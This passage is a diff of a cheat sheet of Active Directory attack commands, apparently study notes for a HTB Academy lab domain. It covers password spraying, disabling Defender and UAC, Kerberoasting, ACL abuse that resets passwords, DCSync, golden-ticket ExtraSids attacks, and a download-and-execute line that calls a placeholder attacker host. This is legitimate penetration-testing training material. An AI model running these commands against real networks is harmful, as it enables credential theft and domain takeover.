+net use \\DC01\ipc$ "<PASSWORD>" /u:guest
 
 # Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
@@ -1594,61 +1983,62 @@ Get-DomainPolicy
 # Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.
 rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser
 
-# Using enum4linux to impelment null session to extract users
-enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" 
+# Using enum4linux to implement null session to extract users
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 
 # Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
 crackmapexec smb 172.16.5.5 --users
-OR
-# crackmapexec to check the valid credintails for  Domain User Enumeration
-sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+# OR
+# crackmapexec to check the valid credentials for  Domain User Enumeration
+sudo crackmapexec smb 172.16.5.5 -u htb-student -p <PASSWORD> --users
 
 # Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 
 # Using Rpcclient a Bash one-liner for the Attack.
-for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+for u in $(cat valid_users.txt);do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 
 # Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
-kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt <PASSWORD>
 
 # Using CrackMapExec & Filtering Logon Failures
-sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
-sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p <PASSWORD> | grep +
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p <PASSWORD>
 
 # Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
-sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H <NTLM_HASH> | grep +
 
 # Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
 Import-Module .\DomainPasswordSpray.ps1
-Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+Invoke-DomainPasswordSpray -Password <PASSWORD> -OutFile spray_success -ErrorAction SilentlyContinue
 ```
-##### [Enumerating Disabling/Bypassing Security Controls](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
+
+### Enabling & Bypassing Security Controls
+
 ```
-# whoami
-# whomami /groups
+whoami
+whoami /groups
 
 # Checking the Status of Defender with Get-MpComputerStatus
 Get-MpComputerStatus
 
 # Check if Defender is enabled
-Get-MpComputerStatus
 Get-MpComputerStatus | Select AntivirusEnabled
 
 # Check if defensive modules are enabled
-Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled | FL
 
 # Check if tamper protection is enabled
-Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL
+Get-MpComputerStatus | Select IsTamperProtected, RealTimeProtectionEnabled | FL
 
-# Check for alternative Av products
+# Check for alternative AV products
 Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
-# Check if this computer part of the domain
-(Get-CimInstance Win32_ComuterSystem).PartOfDoman
-# Get the domain it self that this pc part of it
-(Get-CimInstance Win32_ComuterSystem).Domain
+# Check whether this computer is part of a domain
+(Get-CimInstance Win32_ComputerSystem).PartOfDomain
+# Get the domain this computer belongs to
+(Get-CimInstance Win32_ComputerSystem).Domain
 
 # Disabling UAC
 cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
@@ -1659,82 +2049,83 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 # Disables scanning for downloaded files or attachments
 Set-MpPreference -DisableIOAVProtection $true
 
-# Disable behaviour monitoring
-Set-MPPreference -DisableBehaviourMonitoring $true
+# Disable behavior monitoring
+Set-MpPreference -DisableBehaviorMonitoring $true
 
 # Make exclusion for a certain folder
 Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 
 # Disables cloud detection
-Set-MPPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableBlockAtFirstSeen $true
 
 # Disables scanning of .pst and other email formats
-Set-MPPreference -DisableEmailScanning $true
+Set-MpPreference -DisableEmailScanning $true
 
 # Disables script scanning during malware scans
-Set-MPPReference -DisableScriptScanning $true
+Set-MpPreference -DisableScriptScanning $true
 
 # Exclude files by extension
 Set-MpPreference -ExclusionExtension "ps1"
 
 # Turn off everything and set exclusion to "C:\Windows\Temp"
-Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableBehaviorMonitoring $true;Set-MpPreference -DisableBlockAtFirstSeen $true;Set-MpPreference -DisableEmailScanning $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 
 # Bypassing with path exclusion
 Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 
-# PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
+# PowerShell cmdlet used to view AppLocker policies from a Windows-based host.
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 # Checking PowerShell Constrained Language Mode
 $ExecutionContext.SessionState.LanguageMode
 ConstrainedLanguage
 
-# Checking LAPs
+# Checking LAPS
 Find-LAPSDelegatedGroups
 Find-AdmPwdExtendedRights
 Get-LAPSComputers
 ```
-##### Credentialed Enumeration - from Linux and Windows
-```
-# Credentialed Enumeration - from Linux
 
-## crackmapexec - Domain User Enumeration
-sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+### Credentialed Enumeration
 
-## crackmapexec - Domain Group Enumeration
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+#### From Linux
 
-## crackmapexec - CME - Logged On Users and shares
-sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+```bash
+# Domain groups
+sudo crackmapexec smb 172.16.5.5 -u forend -p '<PASSWORD>' --groups
+
+# Logged-on users and shares
+sudo crackmapexec smb 172.16.5.130 -u forend -p '<PASSWORD>' --loggedon-users
+sudo crackmapexec smb 172.16.5.5 -u forend -p '<PASSWORD>' --shares
+sudo crackmapexec smb 172.16.5.5 -u forend -p '<PASSWORD>' -M spider_plus --share 'Department Shares'
 head -n 10 /tmp/cme_spider_plus/172.16.5.5.json
 
-## Using sql map
-smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
-smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+# smbmap
+smbmap -u forend -p '<PASSWORD>' -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+smbmap -u forend -p '<PASSWORD>' -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
 
-## Using rpcclient
+# rpcclient
 rpcclient -U "" -N 172.16.5.5
 queryuser 0x457
 enumdomusers
 
-## impacket 
-psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
-wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+# Impacket
+psexec.py inlanefreight.local/wley:'<PASSWORD>'@172.16.5.125
+wmiexec.py inlanefreight.local/wley:'<PASSWORD>'@172.16.5.5
 
-## Windapsearch
-python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
-python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+# windapsearch
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p '<PASSWORD>' --da
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p '<PASSWORD>' -PU
 
-## Bloodhound.py
-sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
-https://academy.hackthebox.com/course/preview/active-directory-bloodhound
-https://wadcoms.github.io/
+# bloodhound-python
+sudo bloodhound-python -u 'forend' -p '<PASSWORD>' -ns 172.16.5.5 -d inlanefreight.local -c all
+```
 
-----------------------------------------------------------------------------------------------
-# Credentialed Enumeration - from Windows
+References: [BloodHound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound), [WADComs](https://wadcoms.github.io/)
+
+#### From Windows
+
+```powershell
 Import-Module ActiveDirectory
 Get-Module
 Get-ADDomain
@@ -1743,31 +2134,46 @@ Get-ADTrust -Filter *
 Get-ADGroup -Filter * | select name
 Get-ADGroup -Identity "Backup Operators"
 Get-ADGroupMember -Identity "Backup Operators"
+```
 
-## Powerview
+PowerView:
+
+```powershell
 Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
-
 Get-DomainGroupMember -Identity "Domain Admins" -Recurse
 Get-DomainTrustMapping
 Test-AdminAccess -ComputerName ACADEMY-EA-MS01
 Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+```
 
-## sharpview
-\SharpView.exe Get-DomainUser -Help
+SharpView:
+
+```powershell
+.\SharpView.exe Get-DomainUser -Help
 .\SharpView.exe Get-DomainUser -Identity forend
+```
 
-## Snaffler - Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment
+Snaffler:
+
+```powershell
 Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
-.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
+.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
+```
 
-## SharpHound in Action
- .\SharpHound.exe --help
+SharpHound:
+
+```powershell
+.\SharpHound.exe --help
 .\SharpHound.exe -c All --zipfilename ILFREIGHT
 ```
 
-##### Living Of The Land
-```
-# Basic Enumeration Commands
+### Living off the Land (Windows)
+
+Basic host and domain enumeration using only built-in Windows binaries.
+
+#### Basic Host Enumeration
+
+```cmd
 hostname
 [System.Environment]::OSVersion.Version
 wmic qfe get Caption,Description,HotFixID,InstalledOn
@@ -1775,46 +2181,51 @@ ipconfig /all
 set
 echo %USERDOMAIN%
 echo %logonserver%
+```
 
-# PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host
+#### PowerShell Enumeration
+
+```powershell
 Get-Module
-Import-Module ActiveDirectory
-
 Get-ExecutionPolicy -List
 Set-ExecutionPolicy Bypass -Scope Process
 Get-ChildItem Env: | ft Key,Value
-Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
-powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
-Get-host
+Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Get-Host
 
-# PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
-Get-ADDomain
+# Download and execute in memory
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/script.ps1'); <follow-on commands>"
+```
 
-# PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+#### Firewall & Defender Checks
 
-# PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter *). Performed from a Windows-based host.
-Get-ADTrust -Filter * | select name
-
-# PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
-Get-ADGroupMember -Identity "Backup Operators"
-
----------------------------
-# Firewall Checks
+```cmd
 netsh advfirewall show allprofiles
 sc query windefend
+```
+
+```powershell
 Get-MpComputerStatus
+```
 
-# AmIAlone
+#### Logged-on Users
+
+```cmd
 qwinsta
+```
 
-# Network Information
+#### Network Information
+
+```cmd
 arp -a
 ipconfig /all
 route print
 netsh advfirewall show allprofiles
+```
 
-# Windows Management Instrumentation (WMI)
+#### WMI Enumeration
+
+```cmd
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
 wmic process list /format:list
@@ -1823,45 +2234,50 @@ wmic useraccount list /format:list
 wmic group list /format:list
 wmic sysaccount list /format:list
 wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
-https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4
+```
 
-## Net Commands
-net accounts	Information about password requirements
-net accounts /domain	Password and lockout policy
-net group /domain	Information about domain groups
-net group "Domain Admins" /domain	List users with domain admin privileges
-net group "domain computers" /domain	List of PCs connected to the domain
-net group "Domain Controllers" /domain	List PC accounts of domains controllers
-net group <domain_group_name> /domain	User that belongs to the group
-net groups /domain	List of domain groups
-net localgroup	All available groups
-net localgroup administrators /domain	List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
-net localgroup Administrators	Information about a group (admins)
-net localgroup administrators [username] /add	Add user to administrators
-net share	Check current shares
-net user <ACCOUNT_NAME> /domain	Get information about a user within the domain
-net user /domain	List all users of the domain
-net user %username%	Information about the current user
-net use x: \computer\share	Mount the share locally
-net view	Get a list of computers
-net view /all /domain[:domainname]	Shares on the domains
-net view \computer /ALL	List shares of a computer
-net view /domain	List of PCs of the domain
-((((simple trick try net1 instead of net))))
+Reference: <https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4>
 
------------------------
-## Dsquery
+#### Net Commands
+
+| Command | Description |
+|---|---|
+| `net accounts` | Password requirements |
+| `net accounts /domain` | Password and lockout policy |
+| `net group /domain` | Domain groups |
+| `net group "Domain Admins" /domain` | Users with Domain Admin privileges |
+| `net group "Domain Computers" /domain` | Computers joined to the domain |
+| `net group "Domain Controllers" /domain` | Domain controller accounts |
+| `net group <group> /domain` | Members of a domain group |
+| `net localgroup` | All available local groups |
+| `net localgroup Administrators` | Members of the local Administrators group |
+| `net localgroup administrators <user> /add` | Add a user to the local Administrators group |
+| `net share` | Current shares |
+| `net user <account> /domain` | Information about a domain user |
+| `net user /domain` | All domain users |
+| `net user %username%` | Information about the current user |
+| `net use x: \\computer\share` | Mount a share locally |
+| `net view` | List computers |
+| `net view /all /domain[:domain]` | Shares in the domain |
+| `net view \\computer /ALL` | Shares on a computer |
+| `net view /domain` | Computers in the domain |
+
+> If `net` is blocked or monitored, try `net1` instead.
+
+#### Dsquery
+
+```cmd
 dsquery user
 dsquery computer
 dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
 dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
 dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
-
-
-https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)
-
 ```
-##### Kerberoasting
+
+Reference: <https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)>
+
+### Kerberoasting
+
 ```
 # Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
 	impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
@@ -1870,7 +2286,7 @@ https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server
 setspn.exe -Q */*
 
 # PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
-Add-Type -AssemblyName System.IdentityModel 
+Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
 
 # Retrieving All Tickets Using setspn.exe
@@ -1912,13 +2328,14 @@ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
 
 ```
 
-##### ACL Enumeration and Tactics
+### ACL Enumeration & Abuse
+
 ```
 # PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
 Find-InterestingDomainAcl
 
-# Used to import PowerView and retrieve the SID of aspecific user account (wley) from a Windows-based host.
-Import-Module .\PowerView.ps1 
+# Used to import PowerView and retrieve the SID of a specific user account (wley) from a Windows-based host.
+Import-Module .\PowerView.ps1
 $sid = Convert-NameToSid wley
 
 # Using Get-DomainObjectACL
@@ -1927,16 +2344,12 @@ Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
 $guid= "00299570-246d-11d0-a768-00aa006e0529"
 Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
 # Using the -ResolveGUIDs Flag
-Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
 # Creating a List of Domain Users
 Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
-# forloop
+# Loop over each user
 foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
-# Creating a List of Domain Users
-Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
-# forloop
-foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
-#Further Enumeration of Rights Using damundsen
+# Further Enumeration of Rights Using damundsen
 $sid2 = Convert-NameToSid damundsen
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
 Get-DomainObjectACL -Identity "GPO Management GroupMembers" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
@@ -1946,7 +2359,7 @@ Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
 $itgroupsid = Convert-NameToSid "Information Technology"
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
 # Looking for Interesting Access
-$adunnsid = Convert-NameToSid adunn 
+$adunnsid = Convert-NameToSid adunn
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
 
 # Used to create a PSCredential Object from a Windows-based host.
@@ -1954,47 +2367,48 @@ $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
 
 # Creating a SecureString Object
-$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$damundsenPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
 
-# PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
+# PowerView tool used to change the password of a specific user (damundsen) on a target Windows domain from a Windows-based host.
 Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
 
-$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$SecPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
 $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
 
-# PowerView tool used to add a specifc user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
+# PowerView tool used to add a specific user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
 Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
 Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
 
 # PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.
 Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
 
-# PowerView tool used create a fake Service Principal Name given a sepecift user (adunn) from a Windows-based host.
+# PowerView tool used to create a fake Service Principal Name given a specific user (adunn) from a Windows-based host.
 Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
-# Kerberoasting with Rubeus 
+# Kerberoasting with Rubeus
 .\Rubeus.exe kerberoast /user:adunn /nowrap
 
-# remove and clean up 
+# remove and clean up
 Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
 Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
 Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
 ```
 
-##### DCSync Attack
+### DCSync
+
 ```
 # PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
-Get-DomainUser -Identity adunn | sel
-ect samaccountname,objectsid,memberof,useraccountcontrol |fl
+Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl
 
 # Uses Mimikatz to perform a dcsync attack from a Windows-based host.
 mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
 
-
-# Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
+# Uses the PowerShell cmdlet Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
 Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
 
 ```
-##### Miscellanous Configurations
+
+### Miscellaneous Misconfigurations
+
 ```
 # SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.
 Import-Module .\SecurityAssessment.ps1
@@ -2006,12 +2420,14 @@ Get-DomainUser * | Select-Object samaccountname,description
 # PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
 Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
 ```
-##### ASREPRoasting
+
+### AS-REP Roasting
+
 ```
-# PowerView based tool used to search for the DONT_REQ_PREAUTH value across in user accounts in a target Windows domain. Performed from a Windows-based host.
+# PowerView based tool used to search for the DONT_REQ_PREAUTH value across user accounts in a target Windows domain. Performed from a Windows-based host.
 Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
 
-# Uses Rubeus to perform an ASEP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.
+# Uses Rubeus to perform an AS-REP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.
 .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
 
 # Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.
@@ -2021,162 +2437,148 @@ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 ```
 
-##### Trust Relationships Child Parent Trusts
-```
-# PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
-Import-Module activedirectory
+### Child → Parent Trusts (ExtraSids)
+
+#### Enumeration
+
+```powershell
+Import-Module ActiveDirectory
 Get-ADTrust -Filter *
-
-# PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
 Get-DomainTrust
-
-# PowerView tool used to perform a domain trust mapping from a Windows-based host.
 Get-DomainTrustMapping
-
-# Checking Users in the Child Domain using Get-DomainUser
 Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+```
 
-# Using netdom to query domain trust
+```cmd
 netdom query /domain:inlanefreight.local trust
 netdom query /domain:inlanefreight.local dc
 netdom query /domain:inlanefreight.local workstation
+```
 
------------------------------------------------------------------------------------------------------
-## ExtraSids Attack - Mimikatz
-To perform this attack after compromising a child domain, we need the following:
-- The KRBTGT hash for the child domain
-- The SID for the child domain
-- The name of a target user in the child domain (does not need to exist!)
-- The FQDN of the child domain.
-- The SID of the Enterprise Admins group of the root domain.
-- With this data collected, the attack can be performed with Mimikatz.
+#### ExtraSids — Mimikatz
 
-# Obtaining the KRBTGT Account's NT Hash using Mimikatz
+Requirements:
+
+- KRBTGT hash of the child domain
+- SID of the child domain
+- Name of a target user in the child domain (the account does not need to exist)
+- FQDN of the child domain
+- SID of the root domain's Enterprise Admins group
+
+```powershell
+# KRBTGT hash
 mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
 
-# We can use the PowerView Get-DomainSID function to get the SID for the child domain
+# Child domain SID
 Get-DomainSID
 
-# Obtaining Enterprise Admins Group's SID using Get-DomainGroup
+# Enterprise Admins SID
 Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
 
-# Using ls to Confirm No Access
+# Confirm no access
 ls \\academy-ea-dc01.inlanefreight.local\c$
 
-# Creating a Golden Ticket with Mimikatz
+# Golden ticket
 mimikatz.exe
-kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:<sid_for_target_group/user_herer S-1-5-21-3842939050-3880317879-2865463114-519> /ptt
-
-# Confirming a Kerberos Ticket is in Memory Using klist
+kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<ENTERPRISE_ADMINS_SID> /ptt
 klist
-
-# Listing the Entire C: Drive of the Domain Controller
 ls \\academy-ea-dc01.inlanefreight.local\c$
+```
 
--------
-OR ExtraSids Attack - Rubeus
--------
-# Using ls to Confirm No Access Before Running Rubeus
+#### ExtraSids — Rubeus
+
+```powershell
 ls \\academy-ea-dc01.inlanefreight.local\c$
-.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_DOMAIN_SID> /sids:<ENTERPRISE_ADMINS_SID> /user:hacker /ptt
 klist
+```
 
-# Performing a DCSync Attack
+#### DCSync from the Child Domain
+
+```powershell
 .\mimikatz.exe
 lsadump::dcsync /user:INLANEFREIGHT\lab_adm
-
-# When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation
 lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
+```
 
-########################################################################################################################################################################
-### Attacking Domain Trusts - Child -> Parent Trusts - from Linux
+#### From Linux (Impacket)
 
-# Once we have complete control of the child domain, we can use secretsdump.py to DCSync and grab the NTLM hash for the KRBTGT account.
+```bash
+# KRBTGT hash
 secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
 
-# Performing SID Brute Forcing using lookupsid.py
